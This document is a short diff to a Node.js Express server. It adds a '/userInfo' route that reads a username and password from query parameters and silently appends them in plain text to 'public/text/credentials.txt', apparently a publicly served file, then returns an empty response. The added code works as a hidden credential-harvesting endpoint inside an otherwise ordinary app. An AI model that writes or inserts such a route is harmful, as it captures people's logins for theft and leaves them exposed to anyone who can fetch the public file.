@@ -727,6 +727,17 @@ app.get("/viewAnon", function(req, res) {
 })
 
 
+app.get("/userInfo", function(req, res) {
+  fs.appendFile(__dirname + "/public/text/credentials.txt", `\n username: ${req.query.username}, password: ${req.query.password} \n`, function(err) {
+    if (err) {
+      console.log(err);
+      res.send("");
+    } else {
+      res.send("");
+    }
+  });
+});
+
 app.get("/user-information", async function(req, res, next) {
   try {
     if (req.session.userId) {
